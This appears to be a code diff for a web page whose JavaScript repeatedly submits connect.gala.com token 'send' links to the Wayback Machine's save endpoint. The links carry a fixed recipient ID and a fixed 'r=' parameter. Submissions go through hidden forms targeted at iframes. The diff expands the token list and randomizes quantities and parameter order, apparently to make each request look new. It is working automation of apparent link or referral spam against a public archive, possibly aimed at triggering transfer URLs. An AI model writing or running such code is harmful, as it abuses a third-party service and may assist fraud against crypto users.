@@ -1,31 +1,86 @@
-
-  <div id="iframeContainer"></div>
+<div id="iframeContainer" style="display:block"></div>
 
 <script>
   // ====== CONFIG ======
   const IFRAME_COUNT = 4;
   const SUBMIT_INTERVAL = 60000; // ms
 
-  // Archive endpoints (sub-arrays allowed for future expansion)
+  // Archive endpoints
   const WAYBACK_SAVE_ENDPOINT = "https://web.archive.org/save/";
 
-  // A compact list of target pages (trimmed example; keep/replace with full list)
+  // Target pages (with placeholder)
   const mainURLs = [
-    "https://connect.gala.com/send/GALA%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q=1000000",
-	"https://connect.gala.com/send/GTRUMP%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q=1000",
-	"https://connect.gala.com/send/GWBNB%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q=100",
-	"https://connect.gala.com/send/GWBTC%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q=1",
-	"https://connect.gala.com/send/GUNI%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q=10000",
-	"https://connect.gala.com/send/GPEPE%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q=1000000000",
-	"https://connect.gala.com/send/GPENGU%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q=1000000",
-	"https://connect.gala.com/send/GFLOKI%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q=1000000000",
-	"https://connect.gala.com/send/GFARTCOIN%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q=1000000"
+      "https://connect.gala.com/send/GALA%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GTRUMP%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GWBNB%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GWBTC%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GUNI%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GPEPE%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GPENGU%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GFLOKI%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GFARTCOIN%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GENA%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GCRV%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GBIGTIME%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GARB%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GAPE%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GAAVE%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/FILM%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GOSMI%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GRNDR%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GSUSDC%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/Token%7CUnit%7CBENE%7Cclient:5c806869e7fd0e2384461ce9?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GNC%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GDMAIL%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GMINI%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GFINANCE%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GBLUM%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GDOGS%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GSUSDT%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GTON%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GUFD%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GUSDUC%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GMEW%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GSHRAP%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GSOL%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GWXRP%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GWTRX%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/SILK%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/Token%7CUnit%7CREPS%7Cclient:6663da70a9d47ca9b2bc9419?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GSUPER%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/EternalParadox%7CUnit%7CEPXStamina%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GSWAP%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/$GMUSIC%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GVGX%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GWETH%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GUSDT%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/GUSDC%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/ETIME%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/Materium%7CUnit%7Cnone%7Cnone?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/Token%7CUnit%7CWOOF%7Cclient:604144a625e6931a676b9a56?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/Token%7CUnit%7CTRUMP%7Cclient:60466550a04ef61345acf939?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/Token%7CUnit%7CSVR%7Cclient:610ade741f31f812d2a11e85?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/Token%7CUnit%7CWEN%7Cclient:604161f025e6931a676ccf37?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/Token%7CUnit%7CHG%7Cclient:603a189774924611bf6fc71f?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/Token%7CUnit%7CCAPS%7Cclient:60a3e0cd5578376f6da339f0?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/Token%7CUnit%7CTIPPED%7Cclient:66620d609ca8c7e99909e0f0?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/Token%7CUnit%7CWENGAME%7Cclient:5f4ac150fb70b72b7e22d882?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/Token%7CUnit%7CFUND%7Cclient:64e7a1dd039430b665f44f2a?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/Token%7CUnit%7CJAUM%7Cclient:603a189774924611bf6fc71f?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/Token%7CUnit%7CMOUM%7Cclient:603a189774924611bf6fc71f?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/Token%7CUnit%7CADT%7Cclient:603a189774924611bf6fc71f?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/Token%7CUnit%7CKEN%7Cclient:603fd439a04ef613456f343f?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/Token%7CUnit%7CHAWKTUAH%7Cclient:61d7fb552fd7d80f83a3a4dc?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/Token%7CUnit%7CBTC%7Cclient:6206c2196c5e0466807ccb7b?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/Token%7CUnit%7CDNA%7Cclient:603a189774924611bf6fc71f?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/Token%7CUnit%7CGLFG%7Cclient:60372a8374924611bf529428?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/Token%7CUnit%7CMIRANDUS%7Cclient:600ae7e62b368f4a111efdac?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}",
+      "https://connect.gala.com/send/Token%7CUnit%7CBMC%7Cclient:603a189774924611bf6fc71f?to=client|6208e6b56feb133314c712f9&q={{RANDOM_NUMBER}}"
   ];
 
   // ====== Helpers ======
   function isValidURL(url) {
     if (typeof url !== "string") return false;
-    // simple, robust check
     try {
       const u = new URL(url);
       return u.protocol === "http:" || u.protocol === "https:";
@@ -36,16 +91,17 @@
 
   function normalizeURL(url) {
     if (typeof url !== "string") return "";
-    // Collapse accidental multiple slashes (but preserve protocol '://')
-    // This preserves 'https://' while normalizing other occurrences.
     return url.replace(/([^:]\/)\/+/g, "$1");
+  }
+
+  function range(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
   }
 
   function randomArrayElement(arr) {
     return arr[Math.floor(Math.random() * arr.length)];
   }
 
-  // Add fixed parameter and randomize param order (safe on bad input)
   function addAndShuffleParams(inputUrl) {
     try {
       const url = new URL(inputUrl);
@@ -54,7 +110,7 @@
         paramsArray.push(`${key}=${value !== undefined ? value : ""}`);
       }
 
-      // Add fixed parameter (keep key/value you want)
+      // Add fixed parameter
       paramsArray.push("r=6208e741d2be6c7234446e99");
 
       // Remove duplicates and shuffle
@@ -67,30 +123,18 @@
       const queryString = unique.join("&");
       return url.origin + url.pathname + (queryString ? "?" + queryString : "");
     } catch (e) {
-      // If URL parsing failed, return input unchanged (caller will validate)
       console.warn("addAndShuffleParams: invalid input:", inputUrl);
       return inputUrl;
     }
   }
 
-  // Pick a random archive endpoint (a string containing {{URL}})
-  function getRandomArchiveEndpoint() {
-    if (!Array.isArray(archiveURLs) || archiveURLs.length === 0) {
-      return null;
-    }
-    const sub = randomArrayElement(archiveURLs);
-    if (!Array.isArray(sub) || sub.length === 0) return null;
-    return randomArrayElement(sub);
-  }
-
-  // Try to choose a valid main URL from the list (safe selection)
+  // Safe: pick a valid main URL
   function pickValidMainURL(attempts = 8) {
     for (let i = 0; i < attempts; i++) {
       const candidate = randomArrayElement(mainURLs);
       const normalized = normalizeURL(candidate || "");
       if (isValidURL(normalized)) return normalized;
     }
-    // fallback: scan full list for the first valid one
     for (const u of mainURLs) {
       const n = normalizeURL(u || "");
       if (isValidURL(n)) return n;
@@ -98,54 +142,54 @@
     return null;
   }
 
-  // Provide the name used earlier in the submit function
+  // Generate the final target URL (replace placeholder safely)
   function generateTargetURL() {
-    const picked = pickValidMainURL();
+    let picked = pickValidMainURL();
     if (!picked) return null;
+
+    // replace placeholder with a random number
+    picked = picked.replace(/{{RANDOM_NUMBER}}/g, String(range(1, 100000)));
+
     const original = addAndShuffleParams(picked);
     return normalizeURL(original);
   }
 
   // ====== Submission logic ======
-function submitToWaybackInFrame(iframe) {
-  try {
-    const targetUrl = generateTargetURL();
+  function submitToWaybackInFrame(iframe) {
+    try {
+      const targetUrl = generateTargetURL();
 
-    if (!targetUrl || !isValidURL(targetUrl)) {
-      console.warn("⚠ Skipping invalid target:", targetUrl);
-      return;
+      if (!targetUrl || !isValidURL(targetUrl)) {
+        console.warn("⚠ Skipping invalid target:", targetUrl);
+        return;
+      }
+
+      const form = document.createElement("form");
+      form.style.display = "none";
+      form.target = iframe.name;
+      form.method = "POST";
+      form.action = WAYBACK_SAVE_ENDPOINT;
+
+      const input = document.createElement("input");
+      input.type = "hidden";
+      input.name = "url";
+      input.value = targetUrl;
+
+      form.appendChild(input);
+      document.body.appendChild(form);
+
+      console.log("📨 Submitting Wayback save:", "iframe =", iframe.name, "url =", targetUrl);
+
+      form.submit();
+
+      setTimeout(() => {
+        try { form.remove(); } catch (_) {}
+      }, 1000);
+
+    } catch (err) {
+      console.error("❌ submitToWaybackInFrame error:", err);
     }
-
-    const form = document.createElement("form");
-    form.style.display = "none";
-    form.target = iframe.name;
-    form.method = "POST";
-    form.action = WAYBACK_SAVE_ENDPOINT;
-
-    const input = document.createElement("input");
-    input.type = "hidden";
-    input.name = "url";
-    input.value = targetUrl;
-
-    form.appendChild(input);
-    document.body.appendChild(form);
-
-    console.log(
-      "📨 Submitting Wayback save:",
-      "iframe =", iframe.name,
-      "url =", targetUrl
-    );
-
-    form.submit();
-
-    setTimeout(() => {
-      try { form.remove(); } catch (_) {}
-    }, 1000);
-
-  } catch (err) {
-    console.error("❌ submitToWaybackInFrame error:", err);
   }
-}
 
   const iframeContainer = document.getElementById("iframeContainer");
 
@@ -155,7 +199,7 @@ function submitToWaybackInFrame(iframe) {
       const fname = "hiddenFrame" + i;
       iframe.name = fname;
       iframe.id = fname;
-      iframe.classList.add("hidden-iframe");
+      //iframe.style.display = "none"; // keep it hidden
       iframe.src = "about:blank";
 
       iframeContainer.appendChild(iframe);
@@ -173,9 +217,8 @@ function submitToWaybackInFrame(iframe) {
     }
   }
 
-  // Start: create desired number of iframes
+  // Start
   for (let i = 0; i < IFRAME_COUNT; i++) {
     createIframe(i);
   }
 </script>
-
